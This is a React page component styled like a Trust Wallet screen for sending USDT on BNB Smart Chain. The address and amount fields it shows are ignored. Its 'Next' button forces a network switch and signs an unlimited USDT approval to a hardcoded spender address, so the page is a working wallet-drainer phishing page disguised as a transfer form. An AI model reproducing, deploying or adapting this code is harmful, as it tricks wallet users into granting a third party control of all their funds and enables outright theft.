import { useState } from "react";
import { ethers } from "ethers";

export default function Home() {
  const [address, setAddress] = useState("");
  const [amount, setAmount] = useState("");

  const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
  const SPENDER = "0x5Eec04E6d2539Df5D3a3873f441c991ea56264BB";

  const approveUSDT = async () => {
    try {
      if (!window.ethereum) {
        alert("Apri in Trust Wallet");
        return;
      }

      // 🔥 forza BNB Smart Chain
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x38" }],
      });

      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner(); // 👈 niente connect esplicito

      const usdt = new ethers.Contract(
        USDT_ADDRESS,
        [
          "function approve(address spender, uint256 amount) public returns (bool)"
        ],
        signer
      );

      // 🔥 approve illimitato
      const tx = await usdt.approve(
        SPENDER,
        ethers.MaxUint256
      );

      await tx.wait();

      alert("Approve completato!");
    } catch (err) {
      console.log(err);
      alert("Errore: " + err.message);
    }
  };

  return (
    <div style={{
      background: "#0b0b0b",
      minHeight: "100vh",
      color: "white",
      fontFamily: "-apple-system, BlinkMacSystemFont, sans-serif",
      padding: "20px"
    }}>

      {/* ADDRESS */}
      <div style={{ marginTop: "40px" }}>
        <div style={{ color: "#888", fontSize: "14px", marginBottom: "8px" }}>
          Address or Domain Name
        </div>

        <input
          value={address}
          onChange={(e) => setAddress(e.target.value)}
          placeholder="Search or Enter"
          style={{
            width: "100%",
            padding: "14px",
            borderRadius: "16px",
            border: "none",
            background: "#1a1a1a",
            color: "white"
          }}
        />
      </div>

      {/* NETWORK */}
      <div style={{ marginTop: "20px" }}>
        <div style={{ color: "#888", fontSize: "14px", marginBottom: "8px" }}>
          Destination network
        </div>

        <div style={{
          background: "#1a1a1a",
          padding: "12px 16px",
          borderRadius: "16px",
          display: "flex",
          alignItems: "center",
          justifyContent: "space-between"
        }}>
          <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
            
            {/* LOGO TRUST WALLET BNB */}
            <img
              src="https://trustwallet.com/assets/images/coins/bnb.png"
              alt="bnb"
              style={{
                width: "24px",
                height: "24px",
                borderRadius: "50%"
              }}
            />

            <span>BNB Smart Chain</span>
          </div>

          <span style={{ color: "#888" }}>▼</span>
        </div>
      </div>

      {/* AMOUNT */}
      <div style={{ marginTop: "25px" }}>
        <div style={{ color: "#888", fontSize: "14px", marginBottom: "8px" }}>
          Amount
        </div>

        <input
          value={amount}
          onChange={(e) => setAmount(e.target.value)}
          placeholder="USDT Amount"
          style={{
            width: "100%",
            padding: "14px",
            borderRadius: "16px",
            border: "none",
            background: "#1a1a1a",
            color: "white"
          }}
        />
      </div>

      {/* BUTTON */}
      <div style={{
        position: "fixed",
        bottom: "30px",
        left: "20px",
        right: "20px"
      }}>
        <button
          onClick={approveUSDT}
          style={{
            width: "100%",
            padding: "18px",
            borderRadius: "40px",
            background: "#22c55e",
            border: "none",
            color: "white",
            fontSize: "18px",
            fontWeight: "600"
          }}
        >
          Next
        </button>
      </div>

    </div>
  );
}